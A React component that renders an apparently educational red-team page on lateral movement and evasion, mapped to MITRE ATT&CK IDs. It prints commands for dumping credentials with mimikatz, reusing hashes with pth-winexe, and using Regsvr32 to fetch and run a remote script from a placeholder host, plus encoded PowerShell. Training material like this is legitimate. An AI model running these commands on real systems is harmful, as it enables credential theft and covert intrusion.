import React from 'react';
import './CommonStyles.css';

const LateralMovementEvasion = () => {
  return (
    <div className="lateral-movement-content">
      <div className="ctf-header">
        <h1>Lateral Movement and Evasion Techniques</h1>
        <p>
          After establishing persistence, the red team leverages lateral movement techniques to explore the target network and
          evasion tactics to minimize detection. This phase focuses on advancing within the network undetected using tools and methods designed for stealth.
        </p>
      </div>

      <div className="content-section">
        <h3>Lateral Movement Techniques</h3>
        <ul>
          <li>
            <strong>Pass-the-Hash (PtH):</strong> This technique uses stolen password hashes to authenticate across systems without needing plaintext passwords. 
            Tools like <code>mimikatz</code> and <code>pth-winexe</code> are commonly used for PtH attacks.
          </li>
        </ul>
        <p>
          <strong>Command Example:</strong> Using mimikatz to extract NTLM hashes:
        </p>
        <pre><code>{`sekurlsa::logonpasswords`}</code></pre>
        <p>
          The extracted hashes can then be used with pth-winexe or similar tools to initiate lateral movement:
        </p>
        <pre><code>{`pth-winexe -U user%hash //target_ip cmd`}</code></pre>
        <p>
          <strong>TTP:</strong> <strong>T1550.002</strong> – Pass-the-Hash allows lateral movement by reusing valid credentials across the network.
        </p>
      </div>

      <div className="content-section">
        <h3>Evasion Techniques</h3>
        
        <h4>Application Whitelisting Bypass</h4>
        <p>
          To bypass application whitelisting, attackers can use trusted, pre-installed binaries, also known as Living off the Land Binaries (LOLBins), 
          such as <code>Regsvr32.exe</code>. This allows running scripts or commands under the guise of a trusted application.
        </p>
        <p>
          <strong>Command Example:</strong> Using Regsvr32 to execute a remote script:
        </p>
        <pre><code>{`regsvr32 /s /n /u /i:http://remote.server/script.sct scrobj.dll`}</code></pre>
        <p>
          This approach bypasses detection as it uses a legitimate Windows binary to execute code.
        </p>

        <h4>Obfuscation</h4>
        <p>
          Obfuscation techniques help mask malicious activity by blending it with regular processes. For example, encoding PowerShell commands 
          or altering script names can hide an attacker’s intentions. PowerShell encoding is a commonly used technique:
        </p>
        <pre><code>{`powershell -EncodedCommand [Base64EncodedCommand]`}</code></pre>
        <p>
          Obfuscation can also involve renaming scripts or files to mimic legitimate applications or processes, minimizing the risk of detection.
        </p>

        <p>
          <strong>TTPs:</strong> <strong>T1078</strong> – Leveraging valid accounts for access, <strong>T1027</strong> – Obfuscation for evasion.
        </p>
      </div>

      <div className="content-section">
        <h3>Tactics, Techniques, and Procedures (TTPs) Summary</h3>
        <ul>
          <li><strong>T1550.002:</strong> Pass-the-Hash – Using hash-based authentication for lateral movement.</li>
          <li><strong>T1078:</strong> Valid Accounts – Leveraging existing user accounts to access systems.</li>
          <li><strong>T1027:</strong> Obfuscation – Using techniques like encoding and script renaming to evade security tools.</li>
        </ul>
      </div>

      <div className="ctf-summary">
        <h3>Conclusion</h3>
        <p>
          By combining lateral movement and evasion techniques, red teams can move within a target environment while remaining undetected. 
          These methods, including Pass-the-Hash, whitelisting bypass, and obfuscation, highlight the importance of real-time monitoring 
          and proactive defenses in network security.
        </p>
      </div>
    </div>
  );
};

export default LateralMovementEvasion;
